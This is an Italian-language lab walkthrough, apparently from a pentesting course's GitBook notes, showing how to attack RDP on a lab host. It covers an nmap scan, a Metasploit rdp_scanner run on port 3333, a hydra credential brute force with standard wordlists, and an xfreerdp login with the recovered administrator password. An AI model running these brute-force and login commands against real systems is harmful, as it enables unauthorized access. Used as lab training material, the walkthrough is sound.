# Exploiting RDP

<figure><img src="../../.gitbook/assets/image (780).png" alt=""><figcaption></figcaption></figure>

## Port scan sul target

```
nmap -sV 10.2.24.86
```

<figure><img src="../../.gitbook/assets/image (770).png" alt=""><figcaption></figcaption></figure>

Non vediamo la porta 3389 però, vediamo una 3333 che non è la porta di default RDP e da qui non capiamo che servizio sia.

Per capire cosa sia puoi o tentare la connessione via RDP mettendo la porta diversa oppure usare un modulo MSF

## Modulo MSF per scanner porte RDP

```
msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
show options
set RHOSTS 10.2.24.86
set RPORT 3333 //la porta che ipotizziamo abbia aperto il servizio RDP
run
```

<figure><img src="../../.gitbook/assets/image (773).png" alt=""><figcaption></figcaption></figure>

Dal risultato vediamo che ci fornisce la versione della build per windows quindi sappiamo che RDP è running.&#x20;

## Bruteforce a RDP per trovare le credenziali

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333
// dove 3333 è la porta RDP, se non la specifichiamo con -s hydra assume la porta di default
```

<figure><img src="../../.gitbook/assets/image (775).png" alt=""><figcaption></figcaption></figure>

ATTENZIONE: regolare la brute force speed in casi reali usando -t 2 or-t 3

<figure><img src="../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>

hydra ha identificato delle credenziali valide.

Ignorare la scritta "ERROR freerdp the connection failed to establish" perché semplicemente in questo laboratorio freerdp come sw non è supportato e useremo infatti xfreerdp.

### Autenticarci via RDP (connetterci con xfreerdp)

```
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.24.86:3333
// confermiamo con YES che ci fidiamo del certificato
```

<figure><img src="../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (777).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (778).png" alt=""><figcaption></figcaption></figure>

